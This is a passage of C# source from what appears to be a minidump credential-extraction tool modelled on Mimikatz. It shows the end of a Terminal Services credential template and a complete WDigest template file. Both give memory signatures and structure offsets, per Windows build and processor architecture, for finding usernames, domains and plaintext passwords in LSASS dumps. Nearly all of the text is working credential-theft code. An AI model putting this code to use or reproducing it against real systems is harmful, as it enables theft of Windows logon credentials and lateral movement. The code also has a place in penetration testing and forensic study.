                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x8b, 0xff, 0x53, 0xbb };
                    template.avl_offset = 4;
                    template.TSCredTypeSize = Marshal.SizeOf(new KIWI_TS_CREDENTIAL());
                    template.TSCredLocallyUniqueIdentifierOffset = FieldOffset<KIWI_TS_CREDENTIAL>("LocallyUniqueIdentifier");
                    template.TSCredOffset = FieldOffset<KIWI_TS_CREDENTIAL>("pTsPrimary");
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.signature = new byte[] { 0x8b, 0xff, 0x57, 0xbf };
                    template.avl_offset = 4;
                    template.TSCredTypeSize = Marshal.SizeOf(new KIWI_TS_CREDENTIAL_1607());
                    template.TSCredLocallyUniqueIdentifierOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("LocallyUniqueIdentifier");
                    template.TSCredOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("pTsPrimary");
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.signature = new byte[] { 0x8b, 0xff, 0x57, 0xbf };
                    template.avl_offset = 4;
                    template.TSCredTypeSize = Marshal.SizeOf(new KIWI_TS_CREDENTIAL_1607());
                    template.TSCredLocallyUniqueIdentifierOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("LocallyUniqueIdentifier");
                    template.TSCredOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("pTsPrimary");
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }
            return template;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RTL_AVL_TABLE
    {
        public RTL_BALANCED_LINKS BalancedRoot;
        public long OrderedPointer;
        public uint WhichOrderedElement;
        public uint NumberGenericTableElements;
        public uint DepthOfTree;
        public IntPtr RestartKey;
        public uint DeleteCount;
        public IntPtr CompareRoutine;
        public IntPtr AllocateRoutine;
        public IntPtr FreeRoutine;
        public IntPtr TableContext;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RTL_BALANCED_LINKS
    {
        public long Parent;
        public long LeftChild;
        public long RightChild;
        public byte Balance;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
        public byte[] Reserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_TS_PRIMARY_CREDENTIAL
    {
        private readonly IntPtr unk0;
        public KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_TS_CREDENTIAL
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 108)]
        public byte[] unk0;

        private readonly LUID LocallyUniqueIdentifier;
        private readonly IntPtr unk1;
        private readonly IntPtr unk2;
        private readonly IntPtr pTsPrimary;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_TS_CREDENTIAL_1607
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 112)]
        public byte[] unk0;

        private readonly LUID LocallyUniqueIdentifier;
        private readonly IntPtr unk1;
        private readonly IntPtr unk2;
        private readonly IntPtr pTsPrimary;
    }
}
```

`Templates/wdigest_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class wdigest
    {
        public struct WdigestTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public KIWI_WDIGEST_LIST_ENTRY list_entry;
            public int primary_offset;
            public int USERNAME_OFFSET;
            public int HOSTNAME_OFFSET;
            public int PASSWORD_OFFSET;
        }

        public static WdigestTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            WdigestTemplate template = new WdigestTemplate();

            template.USERNAME_OFFSET = 0x30;
            template.HOSTNAME_OFFSET = 0x40;
            template.PASSWORD_OFFSET = 0x50;

            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= sysinfo.BuildNumber &&
                    sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0x48, 0x3b, 0xda, 0x74 };
                    template.first_entry_offset = -4;
                    template.primary_offset = 36;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x48, 0x3b, 0xda, 0x74 };
                    template.first_entry_offset = -4;
                    template.primary_offset = 48;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x48, 0x3b, 0xd9, 0x74 };
                    template.first_entry_offset = -4;
                    template.primary_offset = 48;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else
                {
                    throw new Exception($"Unknown BuildNumber! {sysinfo.BuildNumber}");
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= sysinfo.BuildNumber &&
                    sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0x74, 0x18, 0x8b, 0x4d, 0x08, 0x8b, 0x11 };
                    template.first_entry_offset = -6;
                    template.primary_offset = 36;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x74, 0x18, 0x8b, 0x4d, 0x08, 0x8b, 0x11 };
                    template.first_entry_offset = -6;
                    template.primary_offset = 28;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x74, 0x11, 0x8b, 0x0b, 0x39, 0x4e, 0x10 };
                    template.first_entry_offset = -6;
                    template.primary_offset = 32;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_10)
                {
                    template.signature = new byte[] { 0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10 };
                    template.first_entry_offset = -4;
                    template.primary_offset = 32;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsMinBuild.WIN_10)
                {
                    template.signature = new byte[] { 0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10 };
                    template.first_entry_offset = -6;
                    template.primary_offset = 32;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
                else
                {
                    template.signature = new byte[] { 0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10 };
                    template.first_entry_offset = -6;
                    template.primary_offset = 32;
                    template.list_entry = new KIWI_WDIGEST_LIST_ENTRY();
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }

            return template;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_WDIGEST_LIST_ENTRY
        {
            public long Flink;
            public long Blink;
            public int UsageCount;
            public long This;
            public LUID LocallyUniqueIdentifier;

            public UNICODE_STRING UserName;
            public UNICODE_STRING Domain;
            public UNICODE_STRING Password;
        }
    }
}
```